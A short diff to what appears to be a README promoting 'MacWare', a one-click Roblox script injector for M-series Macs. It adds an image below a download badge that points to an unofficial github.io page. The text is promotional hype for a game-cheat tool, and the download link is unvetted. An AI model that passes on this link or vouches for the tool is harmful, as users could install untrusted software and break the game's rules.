@@ -9,6 +9,8 @@
 
 [![Download MacWare](https://img.shields.io/badge/Download%20MacWare%20Now-Click%20Here-red?style=for-the-badge)](https://wearedevs-apple.github.io/macware/)
 
+<img width="2400" height="1792" alt="1791533395494-01a11fb5-8d1c-7713-9ed9-5a3a35b4d450" src="https://github.com/user-attachments/assets/a96ae5bd-00cc-4f10-bd7b-9ea88f98bf5c" />
+
 Imagine this: You’re on your brand-new M3 MacBook, Roblox is open, and instead of dealing with clunky Wine wrappers, random crashes, and terrible performance… you click **one button** and instantly inject flawless scripts with buttery-smooth execution.
 
 That’s not a dream. That’s **MacWare**.
